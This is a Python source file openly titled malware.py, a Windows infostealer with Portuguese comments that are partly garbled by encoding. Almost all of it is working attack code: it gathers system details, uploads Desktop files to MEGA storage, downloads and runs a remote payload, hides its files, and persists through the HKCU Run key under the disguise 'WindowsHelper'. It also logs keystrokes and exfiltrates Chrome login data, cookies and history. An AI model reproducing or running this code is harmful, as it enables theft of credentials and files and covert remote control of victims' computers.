# malware.py (Windows Edition)
import shell_utilities as su
import base64
import os
import subprocess
import shutil
import sys
import ctypes
from pathlib import Path

# ===========================================
# üïµÔ∏è 1. Informa√ß√µes do sistema e usu√°rio
# ===========================================
def reconnaissance():
    return {
        'user': su.whoami(),
        'system': su.uname(),
        'env': {k: os.environ.get(k, '') for k in ['USERNAME', 'COMPUTERNAME', 'APPDATA']}
    }

# ===========================================
# üîí 2. Roubo de arquivos do Desktop
# ===========================================
def steal_desktop_files(mega_email=None, mega_pass=None):
    if mega_email and mega_pass:
        su.mega_login(mega_email, mega_pass)
    else:
        su.mega_login()

    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    files = su.find(path=desktop, type_filter='f')
    stolen = []
    for f in files:
        if not f.endswith('.lnk') and os.path.getsize(f) < 10 * 1024 * 1024:  # menor que 10MB
            up = su.mega_upload(f)
            link = su.mega_get_link(up)
            stolen.append((f, link))
    return stolen

# ===========================================
# üí£ 3. Dropper de .exe ou .bat remoto
# ===========================================
def drop_and_execute(mega_url):
    filename = "payload.exe"
    su.mega_login()
    su.mega_download_url(mega_url, dest_filename=filename)
    subprocess.Popen(filename, shell=True)

# ===========================================
# üé≠ 4. Ocultar arquivo (atributo 'hidden')
# ===========================================
def hide_file(path):
    ctypes.windll.kernel32.SetFileAttributesW(str(path), 2)  # 2 = Hidden

# ===========================================
# üîÅ 5. Persist√™ncia via registro (HKCU\Run)
# ===========================================
def persist_registry(script_path):
    import winreg
    key = winreg.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as regkey:
        winreg.SetValueEx(regkey, "WindowsHelper", 0, winreg.REG_SZ, script_path)

# ===========================================
# üîç 6. Keylogger b√°sico (opcional)
# ===========================================
def start_keylogger(log_path="keylog.txt"):
    from pynput import keyboard

    def on_press(key):
        with open(log_path, "a") as f:
            f.write(f"{key}\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# ===========================================
# üöÄ 7. Auto-c√≥pia para %APPDATA%
# ===========================================
def copy_to_appdata():
    dest = os.path.join(os.environ['APPDATA'], "WindowsHelper.exe")
    if not os.path.exists(dest):
        shutil.copy2(sys.executable, dest)
        persist_registry(dest)
        hide_file(dest)

# ===========================================
# üîê 8. Exfiltrar arquivos do Chrome (Cookies, Login Data)
# ===========================================
def exfil_chrome_data():
    su.mega_login()
    base = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
    targets = ['Login Data', 'Cookies', 'History']
    for t in targets:
        path = os.path.join(base, t)
        if os.path.exists(path):
            su.mega_upload(path)
